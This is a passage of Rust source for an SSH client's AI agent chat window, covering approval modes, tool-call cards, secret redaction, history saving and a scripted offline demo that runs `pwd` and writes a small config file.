//! AI 对话窗口：默认是真实智能体对话（opencode / Codex / Claude Code 三种，
//! [`crate::agent_host::start_agent`]，默认用哪个读设置库的 `ai_default_agent`）；
//! 调试版里还有一个写死脚本的离线演示（`dev_hooks`，发行版没有）。
//!
//! 离线演示**不启动任何智能体进程、不调用模型、不发起网络请求**，脚本按 100ms tick
//! 推进，执行模式只存在内存里，不写设置库。真实模式懒启动：第一次发送时才找安装、
//! 起智能体（Claude Code 是自己的进程，opencode / Codex 开在共用进程里）；宿主事件和确认请求都在同一个 100ms tick 里取走，界面线程不等待。
//! 产品拉起智能体用用户自己的配置（和 0.2.14 一致）；`ZSSH_AGENT_E2E` 只是自动化测试
//! 是否拉起真实智能体的开关，窗口本身不读它。
//!
//! 真实模式的每个回合结束（或点「停止」时回合还在跑）后，会把对话写进
//! `<数据目录>\ai-history\<智能体>`（和历史面板、Tauri 版共用），写完在底部提示
//! 「已保存到历史」；写文件在后台线程，失败只提示，不影响对话本身。
//!
//! 执行模式沿用 `settings` 表的 `ai_exec_mode`（`manual` / `readonly` / `auto`），
//! 和 AI 智能体窗口、Tauri 版共用；真实模式下工具桥每次执行前都会重新读它。
//! 设置库打不开时窗口照常使用，只在底部提示。

use std::collections::{HashMap, HashSet};
use std::sync::Arc;
use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::sync::mpsc::{Receiver, Sender};
use std::time::{Duration, Instant};

use ::gpui::{
    App, ClickEvent, ClipboardItem, FocusHandle, ImageSource, MouseButton, Resource, ScrollHandle,
    Subscription, Task, Window, WindowBounds, WindowOptions,
};
use gpui_kit::component::button::Button;
use gpui_kit::component::input::{InputEvent, Textarea, TextareaState};
use gpui_kit::component::text::{SelectionFormat, TextView};
use gpui_kit::component::*;
use gpui_kit::prelude::FluentBuilder as _;
use gpui_kit::*;
use serde_json::{Value, json};
use zssh_core::ai::agent::{AgentEvent, AgentModelCatalog};
use zssh_core::ai::bridge::{ApprovalRequest, ExecMode, ExecTargetReport, FileApproval};
use zssh_core::ai::files::make_diff;
use zssh_core::ai::history::{
    HistoryAnchor, HistoryDraft, HistoryMessage, HistoryRecord, HistoryStore, HistorySummary,
    is_secret_key, now_ms,
};
use zssh_core::ai::safety::DangerLevel;
use zssh_core::store::Database;

use crate::agent_host::{AgentSession, HostTarget, send_unless_cancelled, start_agent};
use crate::agent_setup::{self, AgentKind, Availability};
use crate::agent_text::{
    BODY_PREVIEW_CHARS, LinkAction, MESSAGES_PER_PAGE, OUTPUT_PREVIEW_CHARS, OUTPUT_PREVIEW_LINES,
    clip_text, diff_summary, file_danger_reason, fold_diff, input_is_dangerous, link_action,
    markdown_fence, needs_expand, one_line_summary, redact_paths, visible_command_text,
    visible_start,
};
use crate::agent_tools::{
    self, CallView, ExecInfo, LastItem, Location, Phase, RetryNotice, ToolRow, Tracked,
};
use crate::ai_terminals::terminals;
use crate::host_activity;
use crate::install_state;
use crate::ssh_backend::runtime;

/// 下一个对话的编号。
static NEXT_OWNER: AtomicU64 = AtomicU64::new(1);

/// 脚本推进间隔；和 AI 智能体窗口、终端窗口的轮询节奏一致。
const TICK_INTERVAL: Duration = Duration::from_millis(100);

/// 调试版里让窗口从离线演示开始的钩子（走 `dev_hooks`，发行版读不到）。
const DEMO_ENV: &str = "ZSSH_AGENT_DEMO";

/// 模型循环里第一项的显示文字：选它时 `send` 的模型 id 传 `None`。
const DEFAULT_MODEL: &str = "默认";

/// 没有选主机时给用户的提示。
const NO_HOST_HINT: &str = "未选择目标主机：AI 只能对话，不能在任何服务器上执行命令。";

/// 回合结束时还没回答的确认：卡片标成失败，不能看起来像已完成。
const APPROVAL_EXPIRED: &str = "回合结束时仍未确认";

/// 确认在等待期间失效（超时、停止、目标被取消选择）。
const APPROVAL_GONE: &str = "这条确认已失效，没有执行";

/// 回合结束时还在跑的工具：卡片标成已停止，不能一直显示「运行中」。
const TURN_ENDED: &str = "回合已结束";

/// 内容预览最多显示多少个字符（转义之后）。
const PREVIEW_LIMIT: usize = 80;

/// 原文模式下正文还是空的：明确写一句，空代码块看起来像渲染失败。
const RAW_NO_BODY: &str = "（无正文）";

/// 历史面板里的固定文案；测试和界面都从这里取。
const HISTORY_EMPTY: &str = "还没有历史会话";
const HISTORY_RESUMABLE: &str = "可续接";
const HISTORY_CONFIRM_DELETE: &str = "再次点击「确认删除」";
const HISTORY_RESUME_SELECTED: &str = "已打开历史会话，发送消息后继续；目标主机需要重新选择";
const HISTORY_NO_SESSION: &str = "这条历史会话不能续接：没有智能体会话标识。";
const HISTORY_NO_MESSAGES: &str = "这条历史会话没有消息。";
/// 一轮对话写进历史之后底部的提示。
const HISTORY_SAVED: &str = "已保存到历史";
/// 存历史失败时底部提示的前缀；后面跟 `HistoryError` 的文字。
const HISTORY_SAVE_FAILED: &str = "保存到历史失败：";

/// 脚本里的固定文案。测试和界面都从这里取，避免两处各写一份。
const REASONING: &str = "先确认当前目录，再决定是否写入。";
const FIRST_TEXT: &str = "我先看一下当前目录。";
const PWD_OUTPUT: &str = "/srv/app";
const FIRST_DONE_TEXT: &str = "目录是 /srv/app。";
const SECOND_TEXT: &str = "接下来写入配置文件。";
const WRITE_OUTPUT: &str = "已写入 12 字节";
const WRITE_DONE_TEXT: &str = "写入完成。";
const FIRST_DENIED_TEXT: &str = "已取消。";
const SECOND_DENIED_TEXT: &str = "已取消写入。";
const DENIED_ERROR: &str = "用户拒绝执行";
const STOPPED_ERROR: &str = "已停止";

/// 「Markdown 示例」追加的静态助手消息；只演示渲染，不经过脚本，也不调用模型。
const MARKDOWN_SAMPLE: &str = r#"## Markdown 渲染示例

助手消息现在按 Markdown 渲染，下面的块都可以选中并复制原文：

- 支持**粗体**、*斜体*和 `行内代码`
- 支持列表和链接：[示例站点](https://example.com/)
- 远程图片不会加载，只显示占位

| 功能 | 说明 |
| --- | --- |
| 代码块 | 右上角有「复制」按钮 |
| 表格 | 下方有「复制表格」按钮 |

```rust
fn main() {
    println!("hello, zssh");
}
```
"#;

/// 演示脚本里的两个工具调用。
const PWD_INPUT: DemoInput = DemoInput::Command("pwd");
const WRITE_INPUT: DemoInput = DemoInput::WriteFile {
    path: "/srv/app/app.conf",
    content: "mode=prod\n",
};

/// 执行模式在 `ai_exec_mode` 设置项里的字符串值。模式类型本身用 core 的
/// [`ExecMode`]（工具桥判定放行用的就是它），窗口不再自己复制一份。
fn mode_setting(mode: ExecMode) -> &'static str {
    match mode {
        ExecMode::Manual => "manual",
        ExecMode::ReadOnly => "readonly",
        ExecMode::Auto => "auto",
    }
}

fn mode_label(mode: ExecMode) -> &'static str {
    match mode {
        ExecMode::Manual => "逐条确认",
        ExecMode::ReadOnly => "只读自动",
        ExecMode::Auto => "全部放行",
    }
}

fn next_mode(mode: ExecMode) -> ExecMode {
    match mode {
        ExecMode::Manual => ExecMode::ReadOnly,
        ExecMode::ReadOnly => ExecMode::Auto,
        ExecMode::Auto => ExecMode::Manual,
    }
}

/// 点「执行模式」之后的结果：下一个模式，以及要不要写设置库。
/// 只有真实模式才写：设置库里的值是真实的审批策略，离线演示改的只是内存里的演示模式。
fn next_mode_plan(real: bool, current: ExecMode) -> (ExecMode, bool) {
    (next_mode(current), real)
}

/// 递归复制 JSON，把凭据类键的值换成占位；原值仍留给历史存储（由 core 再抹一次）。
/// 键名判断用 core 历史存储的同一份词表（`history::is_secret_key`），不在这里另抄一份。
fn redact_tool_input(value: &Value) -> Value {
    match value {
        Value::Object(map) => Value::Object(
            map.iter()
                .map(|(key, value)| {
                    let value = if is_secret_key(key) {
                        json!("[已隐藏]")
                    } else {
                        redact_tool_input(value)
                    };
                    (key.clone(), value)
                })
                .collect(),
        ),
        Value::Array(items) => Value::Array(items.iter().map(redact_tool_input).collect()),
        other => other.clone(),
    }
}

/// 演示脚本里的工具；真实模式的工具名直接用驱动上报的字符串。
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
enum DemoTool {
    TerminalExec,
    WriteFile,
}

impl DemoTool {
    fn name(self) -> &'static str {
        match self {
            Self::TerminalExec => "terminal_exec",
            Self::WriteFile => "write_file",
        }
    }

    /// 演示脚本里的 `terminal_exec` 只跑 `pwd`，按只读命令处理。
    fn is_read_only(self) -> bool {
        match self {
            Self::TerminalExec => true,
            Self::WriteFile => false,
        }
    }
}

/// 工具输入；只保留界面和确认卡片需要的字段。
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
enum DemoInput {
    Command(&'static str),
    WriteFile {
        path: &'static str,
        content: &'static str,
    },
}

impl DemoInput {
    /// 工具卡片上的一行输入摘要。
    fn summary(self) -> String {
        match self {
            Self::Command(command) => format!("$ {command}"),
            Self::WriteFile { path, .. } => format!("路径：{path}"),
        }
    }

    /// 演示脚本的确认请求：形状和真实桥给的 [`ApprovalRequest`] 一样，
    /// 这样演示和真实模式走同一张确认卡片。
    fn approval_request(self) -> ApprovalRequest {
        let (command, file) = match self {
            Self::Command(command) => (command.to_owned(), None),
            Self::WriteFile { path, content } => (
                format!("write_file {path}"),
                Some(FileApproval {
                    path: path.to_owned(),
                    is_new: true,
                    new_bytes: content.len(),
                    diff: make_diff(None, content),
                }),
            ),
        };
        ApprovalRequest {
            scope: "demo".to_owned(),
            exec_id: "demo".to_owned(),
            target_id: "host-0".to_owned(),
            session_id: None,
            host_label: "演示主机".to_owned(),
            command,
            danger: DangerLevel::Safe,
            reasons: Vec::new(),
            file,
        }
    }
}

/// 工具卡片的输入：演示脚本用固定文案，真实事件用宿主给的参数。
#[derive(Clone, Debug, PartialEq)]
enum ToolInput {
    Demo(DemoInput),
    Real {
        /// 一行摘要。
        summary: String,
        /// 宿主给的原始参数；存历史时原样写进去（截断和脱敏由 core 做）。
        input: Value,
    },
}

impl ToolInput {
    fn summary(&self) -> String {
        match self {
            Self::Demo(input) => input.summary(),
            Self::Real { summary, .. } => summary.clone(),
        }
    }

    /// 命令全文（`run_command` 的 `command` 参数）；没有命令的工具返回 `None`。
    fn command(&self) -> Option<String> {
        match self {
            Self::Demo(DemoInput::Command(command)) => Some((*command).to_owned()),
            Self::Demo(DemoInput::WriteFile { .. }) => None,
            Self::Real { input, .. } => input
                .get("command")
                .and_then(Value::as_str)
                .map(str::to_owned),
        }
    }

    /// 存历史用的参数：真实事件是宿主给的 JSON，演示脚本按同样的形状拼一个。
    fn json(&self) -> Value {
        match self {
            Self::Demo(DemoInput::Command(command)) => json!({ "command": command }),
            Self::Demo(DemoInput::WriteFile { path, content }) => {
                json!({ "path": path, "content": content })
            }
            Self::Real { input, .. } => input.clone(),
        }
    }
}

/// 把换行、制表符转义成一行，太长就截断。只用在一行摘要里，**确认卡片不用它**：
/// 确认的命令和文件内容必须能看到全文。
fn content_preview(content: &str) -> String {
    let mut escaped = String::new();
    for ch in content.chars() {
        match ch {
            '\n' => escaped.push_str("\\n"),
            '\r' => escaped.push_str("\\r"),
            '\t' => escaped.push_str("\\t"),
            _ => escaped.push(ch),
        }
    }
    if escaped.chars().count() > PREVIEW_LIMIT {
        let mut truncated: String = escaped.chars().take(PREVIEW_LIMIT).collect();
        truncated.push('…');
        truncated
    } else {
        escaped
    }
}

/// 当前模式下这个工具要不要先确认。
fn requires_approval(tool: DemoTool, mode: ExecMode) -> bool {
    match mode {
        ExecMode::Auto => false,
        ExecMode::ReadOnly => !tool.is_read_only(),
        ExecMode::Manual => true,
    }
}

/// 一条工具调用的确认状态。
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
enum ApprovalState {
    NotRequired,
    Pending,
    Allowed,
    Denied,
}

/// 工具卡片的状态；`AwaitingApproval` 和 `Running` 都不能显示成已完成。
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
enum ToolStatus {
    AwaitingApproval,
    Running,
    /// 真实模式的确认卡片：用户已经回答（命令结果在另一张工具卡片上）。
    Answered,
    Done,
    Failed,
    Stopped,
}

impl ToolStatus {
    fn label(self) -> &'static str {
        match self {
            Self::AwaitingApproval => "等待确认",
            Self::Running => "运行中…",
            Self::Answered => "已确认",
            Self::Done => "完成",
            Self::Failed => "失败",
            Self::Stopped => "已停止",
        }
    }
}

/// 卡片状态文字：命令跑完带退出码时写「退出码 N」（0.2.14 同），别的用状态名。
fn card_status_text(card: &ToolCard) -> String {
    match (card.status, card.output.as_deref()) {
        (ToolStatus::Done, Some(output)) => agent_tools::exit_code_of(output).map_or_else(
            || card.status.label().to_owned(),
            |code| format!("退出码 {code}"),
        ),
        _ => card.status.label().to_owned(),
    }
}

/// 卡片上结果带出来的几行细节（文字, 是不是警示色）：写系统路径、原文件备份到哪儿、属主没能改回去、
/// 命令在终端里还是后台执行的。界面和调试断言共用这一份，不会各写各的。
fn card_detail_lines(card: &ToolCard) -> Vec<(String, bool)> {
    let Some(output) = card.output.as_deref() else {
        return Vec::new();
    };
    let tool = agent_tools::bare_tool_name(&card.tool);
    let mut lines = Vec::new();
    if tool == "write_file"
        && let Some(reason) = file_danger_reason(output)
    {
        lines.push((format!("写入系统路径：{reason}"), true));
    }
    if let Some(backup) = agent_tools::backup_path_of(output) {
        lines.push((format!("原文件已备份到服务器：{backup}"), false));
    }
    if let Some((from, to)) = agent_tools::owner_change_of(output) {
        lines.push((
            format!("属主从 {from} 变成了 {to}（权限不够，没能改回去）"),
            true,
        ));
    }
    if tool == "run_command" {
        match agent_tools::location_of(output) {
            Some(Location::Terminal) => lines.push(("已在终端里执行".to_owned(), false)),
            Some(Location::Background) => {
                let reason = agent_tools::fallback_reason_of(output)
                    .map(|reason| format!("（{reason}）"))
                    .unwrap_or_default();
                lines.push((format!("已在后台执行{reason}"), false));
            }
            None => {}
        }
    }
    lines
}

/// 确认卡片要给用户审的内容：整份桥给的请求（命令全文、危险等级、原因、文件差异）
/// 加两个展开状态。回答之后也留着，回看时能确认当时批准的是什么。
#[derive(Clone, Debug)]
struct ApprovalDetail {
    request: ApprovalRequest,
    /// 命令框展开（默认限高滚动，超长时给「展开全文」）。
    command_expanded: bool,
    /// 文件差异展开（默认只显示前 30 行）。
    diff_expanded: bool,
}

impl ApprovalDetail {
    fn new(request: ApprovalRequest) -> Self {
        Self {
            request,
            command_expanded: false,
            diff_expanded: false,
        }
    }

    /// 危险命令高亮：和 0.2.14 一样直接看桥给的 `danger` 等级（core 的 `safety::assess`）。
    fn dangerous(&self) -> bool {
        self.request.danger == DangerLevel::Dangerous
    }

    /// 要显示的命令文本：`write_file` 的 `command` 只是 `write_file <路径>`，
    /// 细节在文件区，不重复显示。
    fn command_text(&self) -> Option<String> {
        self.request
            .file
            .is_none()
            .then(|| visible_command_text(&self.request.command))
    }
}

/// 一张工具卡片。`call_id` 是驱动给的调用编号（演示脚本是 `call-1`，真实模式是
/// 宿主的工具调用 id，确认卡片是 `approval-<请求 id>`）。
#[derive(Clone, Debug)]
struct ToolCard {
    call_id: String,
    /// 工具名；真实模式直接用驱动上报的名字。
    tool: String,
    input: ToolInput,
    approval: ApprovalState,
    status: ToolStatus,
    output: Option<String>,
    error: Option<String>,
    /// 输出默认展开；点标题行可以收起。
    output_expanded: bool,
    /// 输出显示全部（默认只显示前几十行，防止长输出拖慢界面）。
    output_full: bool,
    /// 命令框展开（工具卡片上显示的命令，没有确认请求时用）。
    command_expanded: bool,
    /// 确认卡片的内容；非确认卡片为 `None`。
    detail: Option<ApprovalDetail>,
    /// 执行层回报的实际执行位置（哪台主机、哪个终端）；还没回报 / 不带目标的工具为 `None`。
    exec: Option<ExecInfo>,
    /// 回报里的主机名要不要显示在卡片上（对话里有多个目标，或者当时没有「当前」）。
    exec_multi: bool,
}

impl ToolCard {
    fn new(call_id: String, tool: String, input: ToolInput) -> Self {
        Self {
            call_id,
            tool,
            input,
            approval: ApprovalState::NotRequired,
            status: ToolStatus::Running,
            output: None,
            error: None,
            output_expanded: true,
            output_full: false,
            command_expanded: false,
            detail: None,
            exec: None,
            exec_multi: false,
        }
    }

    /// 确认卡片（命令结果在另一张工具卡片上）。
    fn is_approval(&self) -> bool {
        self.call_id.starts_with("approval-")
    }

    /// 命令退出码不是 0（只看已完成的调用）。
    fn exit_failed(&self) -> bool {
        self.status == ToolStatus::Done
            && self
                .output
                .as_deref()
                .and_then(agent_tools::exit_code_of)
                .is_some_and(|code| code != 0)
    }

    /// 工具调用分组用的摘要：等批准的 / 正在执行的绝不折叠。
    fn view(&self) -> CallView {
        CallView {
            phase: match self.status {
                ToolStatus::AwaitingApproval => Phase::AwaitingApproval,
                ToolStatus::Running => Phase::Running,
                _ => Phase::Settled,
            },
            failed: matches!(self.status, ToolStatus::Failed | ToolStatus::Stopped)
                || self.error.is_some()
                || self.exit_failed(),
            is_approval: self.is_approval(),
        }
    }

    /// 工具输入 JSON（桌面窗口的演示输入也有）。
    fn input_json(&self) -> Value {
        self.input.json()
    }

    /// 卡片要不要标"危险"：确认请求的等级、工具输入里的 `danger` 标记、
    /// `write_file` 结果里"写系统路径"的提示，三者任一即可（0.2.14 同样三处）。
    fn dangerous(&self) -> bool {
        self.detail.as_ref().is_some_and(ApprovalDetail::dangerous)
            || input_is_dangerous(&self.input.json())
            || self
                .output
                .as_deref()
                .is_some_and(|output| file_danger_reason(output).is_some())
    }
}

/// 演示脚本里正在等待用户确认的工具调用。
#[derive(Clone, Debug, PartialEq)]
struct PendingApproval {
    call_id: String,
    tool: String,
    input: ToolInput,
}

/// 真实模式里等用户回答的确认请求；`id` 用来回填 `ClaudeSession::resolve_approval`。
#[derive(Clone, Debug, PartialEq, Eq)]
struct RealApproval {
    id: u64,
    call_id: String,
}

/// 真实模式下的一条提示（错误 / 重试 / 续接失败），显示在助手消息里。
#[derive(Clone, Debug, PartialEq, Eq)]
struct Notice {
    text: String,
    error: bool,
}

/// 一条助手消息；文本和思考都往同一条里累积，工具卡片按顺序挂在下面。
#[derive(Clone, Debug, Default)]
struct AssistantMessage {
    text: String,
    reasoning: String,
    reasoning_expanded: bool,
    tools: Vec<ToolCard>,
    notices: Vec<Notice>,
    stopped: bool,
    /// 正文显示原文还是渲染：「原文 / 渲染」按钮切换，只影响显示。
    show_raw: bool,
    /// 超长正文已展开（默认只渲染前面一段）。
    body_expanded: bool,
    /// 展开着的工具调用分组（键 = 这一组第一张卡片的下标，卡片只增不减，下标稳定）。
    open_groups: HashSet<usize>,
}

/// 助手正文的两种显示：Markdown 渲染，或包在代码块里的原始 Markdown。
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
enum BodyMode {
    Rendered,
    Raw,
}

impl BodyMode {
    /// 切换按钮上的文字：当前是渲染就让用户看原文，反之亦然。
    fn toggle_label(self) -> &'static str {
        match self {
            Self::Rendered => "原文",
            Self::Raw => "渲染",
        }
    }
}

/// 正文当前该按哪种模式显示；`show_raw` 只影响显示，不动累积和历史。
fn body_mode(message: &AssistantMessage) -> BodyMode {
    if message.show_raw {
        BodyMode::Raw
    } else {
        BodyMode::Rendered
    }
}

/// 把原始 Markdown 包进代码围栏。围栏由 [`markdown_fence`] 按正文里最长的反引号串
/// 现算：正文里再多的反引号也关不掉外层，也就不会有内容"逃"出来按 Markdown 渲染；
/// 换行原样保留，代码块的「复制」拿到的就是模型返回的原文。
fn raw_markdown_block(text: &str) -> String {
    markdown_fence(text)
}

/// 正文超长时的折叠：渲染 Markdown 每帧都要解析，几十万字符的正文会拖慢整个窗口。
/// 返回要显示的正文和是否被折叠；`expanded` 为真时全显。
fn clipped_body(text: &str, expanded: bool) -> (String, bool) {
    if expanded {
        return (text.to_owned(), false);
    }
    let clip = clip_text(text, usize::MAX, BODY_PREVIEW_CHARS);
    (clip.text, clip.clipped)
}

/// 正文 TextView 的 Markdown 源；`None` 表示渲染模式下没有正文（交给「正在生成…」）。
fn body_markdown(message: &AssistantMessage, mode: BodyMode) -> Option<String> {
    let (text, _) = clipped_body(&message.text, message.body_expanded);
    match mode {
        BodyMode::Rendered => (!text.is_empty()).then_some(text),
        BodyMode::Raw if text.is_empty() => Some(RAW_NO_BODY.to_owned()),
        BodyMode::Raw => Some(raw_markdown_block(&text)),
    }
}

/// 对话里的一条消息。
#[derive(Clone, Debug)]
enum ChatMessage {
    User(String),
    Assistant(AssistantMessage),
}

/// 历史面板当前显示什么；关着时消息区照常显示。
#[derive(Clone, Debug, Default, PartialEq)]
enum HistoryPanel {
    /// 关着：显示对话。
    #[default]
    Closed,
    /// 当前智能体的历史列表。
    List,
    /// 只读查看一条历史会话。
    Detail(Box<HistoryRecord>),
}

/// 脚本每一步发出的事件；界面只认这些事件，不直接读脚本内部状态。
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
enum TurnEvent {
    ReasoningDelta(&'static str),
    TextDelta(&'static str),
    ToolStart {
        call_id: &'static str,
        tool: DemoTool,
        input: DemoInput,
        needs_approval: bool,
    },
    ToolEnd {
        call_id: &'static str,
        outcome: Result<&'static str, &'static str>,
    },
    TurnEnd,
}

/// 脚本位置。确认等待是独立的阶段，等待期间 tick 不会推进。
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
enum Stage {
    Reasoning,
    Intro,
    FirstTool,
    FirstWait,
    FirstRun,
    FirstAfter,
    FirstDenied,
    FirstDeniedText,
    SecondIntro,
    SecondTool,
    SecondWait,
    SecondRun,
    SecondAfter,
    SecondDenied,
    SecondDeniedText,
    End,
    Finished,
}

/// 写死的演示脚本。`tick` 每次只走一步，确认按钮通过 `resolve` 放行/拒绝。
#[derive(Clone, Copy, Debug)]
struct TurnScript {
    stage: Stage,
}

impl TurnScript {
    fn new() -> Self {
        Self {
            stage: Stage::Reasoning,
        }
    }

    /// 推进一步；等待确认时返回 `None`。模式只在 `ToolStart` 那一步读取。
    fn tick(&mut self, mode: ExecMode) -> Option<TurnEvent> {
        match self.stage {
            Stage::Reasoning => {
                self.stage = Stage::Intro;
                Some(TurnEvent::ReasoningDelta(REASONING))
            }
            Stage::Intro => {
                self.stage = Stage::FirstTool;
                Some(TurnEvent::TextDelta(FIRST_TEXT))
            }
            Stage::FirstTool => {
                let needs_approval = requires_approval(DemoTool::TerminalExec, mode);
                self.stage = if needs_approval {
                    Stage::FirstWait
                } else {
                    Stage::FirstRun
                };
                Some(TurnEvent::ToolStart {
                    call_id: "call-1",
                    tool: DemoTool::TerminalExec,
                    input: PWD_INPUT,
                    needs_approval,
                })
            }
            Stage::FirstWait => None,
            Stage::FirstRun => {
                self.stage = Stage::FirstAfter;
                Some(TurnEvent::ToolEnd {
                    call_id: "call-1",
                    outcome: Ok(PWD_OUTPUT),
                })
            }
            Stage::FirstAfter => {
                self.stage = Stage::SecondIntro;
                Some(TurnEvent::TextDelta(FIRST_DONE_TEXT))
            }
            Stage::FirstDenied => {
                self.stage = Stage::FirstDeniedText;
                Some(TurnEvent::ToolEnd {
                    call_id: "call-1",
                    outcome: Err(DENIED_ERROR),
                })
            }
            Stage::FirstDeniedText => {
                self.stage = Stage::End;
                Some(TurnEvent::TextDelta(FIRST_DENIED_TEXT))
            }
            Stage::SecondIntro => {
                self.stage = Stage::SecondTool;
                Some(TurnEvent::TextDelta(SECOND_TEXT))
            }
            Stage::SecondTool => {
                let needs_approval = requires_approval(DemoTool::WriteFile, mode);
                self.stage = if needs_approval {
                    Stage::SecondWait
                } else {
                    Stage::SecondRun
                };
                Some(TurnEvent::ToolStart {
                    call_id: "call-2",
                    tool: DemoTool::WriteFile,
                    input: WRITE_INPUT,
                    needs_approval,
                })
            }
            Stage::SecondWait => None,
            Stage::SecondRun => {
                self.stage = Stage::SecondAfter;
                Some(TurnEvent::ToolEnd {
                    call_id: "call-2",
                    outcome: Ok(WRITE_OUTPUT),
                })
            }
            Stage::SecondAfter => {
                self.stage = Stage::End;
                Some(TurnEvent::TextDelta(WRITE_DONE_TEXT))
            }
            Stage::SecondDenied => {
                self.stage = Stage::SecondDeniedText;
                Some(TurnEvent::ToolEnd {
                    call_id: "call-2",
                    outcome: Err(DENIED_ERROR),
                })
            }
            Stage::SecondDeniedText => {
                self.stage = Stage::End;
                Some(TurnEvent::TextDelta(SECOND_DENIED_TEXT))
            }
            Stage::End => {
                self.stage = Stage::Finished;
                Some(TurnEvent::TurnEnd)
            }
            Stage::Finished => None,
        }
    }

    /// 放行/拒绝当前等待的确认；不在等待阶段时返回 `false`。
    fn resolve(&mut self, allow: bool) -> bool {
        match self.stage {
            Stage::FirstWait => {
                self.stage = if allow {
                    Stage::FirstRun
                } else {
                    Stage::FirstDenied
                };
                true
            }
            Stage::SecondWait => {
                self.stage = if allow {
                    Stage::SecondRun
                } else {
                    Stage::SecondDenied
                };
                true
            }
            _ => false,
        }
    }
}

/// 纯状态：消息、工具卡片、演示脚本位置和真实回合状态。界面只调用这里的方法。
#[derive(Debug, Default)]
struct ChatState {
    messages: Vec<ChatMessage>,
    /// 当前回合的助手消息下标；回合结束后清掉。
    active: Option<usize>,
    script: Option<TurnScript>,
    pending: Option<PendingApproval>,
    /// 真实模式：宿主回合是否还在跑；和演示脚本无关。
    real_running: bool,
    /// 真实模式里还没回答的确认。
    approvals: Vec<RealApproval>,
    /// 带目标的工具调用，用来把执行层回报配到卡片上（V2-G10b，规则见 `agent_tools`）。
    tracked: Vec<Tracked>,
    /// 这个对话收到的执行位置回报（执行编号 → 回报）。
    reports: HashMap<String, ExecTargetReport>,
    /// 回报到了、对应的卡片还没出现：先存着，卡片出现时再认领。
    unclaimed: Vec<ExecTargetReport>,
    /// 回报到的时候要在卡片上标主机名的那些执行编号。
    report_multi: HashSet<String>,
    /// 智能体正在带退避地自动重试（「思考中」旁边的提示）；有新动静就清掉。
    retry: Option<RetryNotice>,
    /// 这一轮开始的时间（「思考中」显示已经等了多久）。
    turn_started: Option<Instant>,
    /// 回合里最后一次动静是什么（决定要不要显示「思考中」）。
    last_item: Option<LastKind>,
    /// 回合进行中用户补充的消息（V2-U1：三种驱动在回合里都回 Busy，所以先排队）。
    queue: queue::PendingQueue,
}

/// 回合里最后一次动静。
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
enum LastKind {
    User,
    Text,
    Tool,
}

impl ChatState {
    fn is_running(&self) -> bool {
        self.script.is_some() || self.real_running
    }

    #[cfg(test)]
    fn pending(&self) -> Option<&PendingApproval> {
        self.pending.as_ref()
    }

    /// 发一条消息并开始脚本；正在跑或输入为空时不做事。
    fn start_turn(&mut self, prompt: &str) -> bool {
        if self.is_running() {
            return false;
        }
        let prompt = prompt.trim();
        if prompt.is_empty() {
            return false;
        }
        self.messages.push(ChatMessage::User(prompt.to_owned()));
        self.messages
            .push(ChatMessage::Assistant(AssistantMessage::default()));
        self.active = Some(self.messages.len() - 1);
        self.script = Some(TurnScript::new());
        self.pending = None;
        self.approvals.clear();
        true
    }

    /// 推进一步脚本并落到消息上；返回是否有变化。
    fn advance(&mut self, mode: ExecMode) -> bool {
        let Some(script) = self.script.as_mut() else {
            return false;
        };
        let Some(event) = script.tick(mode) else {
            return false;
        };
        let ended = matches!(event, TurnEvent::TurnEnd);
        self.apply(event);
        if ended {
            self.script = None;
            self.pending = None;
            self.active = None;
        }
        true
    }

    /// 把脚本事件写进当前助手消息。
    fn apply(&mut self, event: TurnEvent) {
        match event {
            TurnEvent::ReasoningDelta(delta) => {
                if let Some(message) = self.active_assistant_mut() {
                    push_paragraph(&mut message.reasoning, delta);
                }
            }
            TurnEvent::TextDelta(delta) => {
                if let Some(message) = self.active_assistant_mut() {
                    push_paragraph(&mut message.text, delta);
                }
            }
            TurnEvent::ToolStart {
                call_id,
                tool,
                input,
                needs_approval,
            } => {
                if let Some(message) = self.active_assistant_mut() {
                    let mut card = ToolCard::new(
                        call_id.to_owned(),
                        tool.name().to_owned(),
                        ToolInput::Demo(input),
                    );
                    if needs_approval {
                        card.approval = ApprovalState::Pending;
                        card.status = ToolStatus::AwaitingApproval;
                        card.detail = Some(ApprovalDetail::new(input.approval_request()));
                    }
                    message.tools.push(card);
                }
                if needs_approval {
                    self.pending = Some(PendingApproval {
                        call_id: call_id.to_owned(),
                        tool: tool.name().to_owned(),
                        input: ToolInput::Demo(input),
                    });
                }
            }
            TurnEvent::ToolEnd { call_id, outcome } => {
                if let Some(message) = self.active_assistant_mut()
                    && let Some(card) = message
                        .tools
                        .iter_mut()
                        .find(|card| card.call_id == call_id)
                {
                    match outcome {
                        Ok(output) => {
                            card.output = Some(output.to_owned());
                            card.error = None;
                            card.status = ToolStatus::Done;
                            card.output_expanded = true;
                        }
                        Err(error) => {
                            card.output = None;
                            card.error = Some(error.to_owned());
                            card.status = ToolStatus::Failed;
                        }
                    }
                }
                if self
                    .pending
                    .as_ref()
                    .is_some_and(|pending| pending.call_id == call_id)
                {
                    self.pending = None;
                }
            }
            TurnEvent::TurnEnd => {
                self.pending = None;
            }
        }
    }

    /// 确认当前等待的工具；`call_id` 对不上说明界面状态过期，直接拒绝。
    fn resolve_approval(&mut self, call_id: &str, allow: bool) -> bool {
        let call_id = call_id.to_owned();
        let Some(pending) = self.pending.as_ref() else {
            return false;
        };
        if pending.call_id != call_id {
            return false;
        }
        let Some(script) = self.script.as_mut() else {
            return false;
        };
        if !script.resolve(allow) {
            return false;
        }
        self.pending = None;
        if let Some(message) = self.active_assistant_mut()
            && let Some(card) = message
                .tools
                .iter_mut()
                .find(|card| card.call_id == call_id)
        {
            card.approval = if allow {
                ApprovalState::Allowed
            } else {
                ApprovalState::Denied
            };
            if allow {
                card.status = ToolStatus::Running;
            } else {
                card.status = ToolStatus::Failed;
                card.error = Some(DENIED_ERROR.to_owned());
            }
        }
        true
    }

    /// 真实模式：记下用户消息并开一个回合；宿主事件稍后由 tick 取来。
    fn start_real_turn(&mut self, prompt: &str) -> bool {
        if self.is_running() {
            return false;
        }
        let prompt = prompt.trim();
        if prompt.is_empty() {
            return false;
        }
        self.messages.push(ChatMessage::User(prompt.to_owned()));
        self.messages
            .push(ChatMessage::Assistant(AssistantMessage::default()));
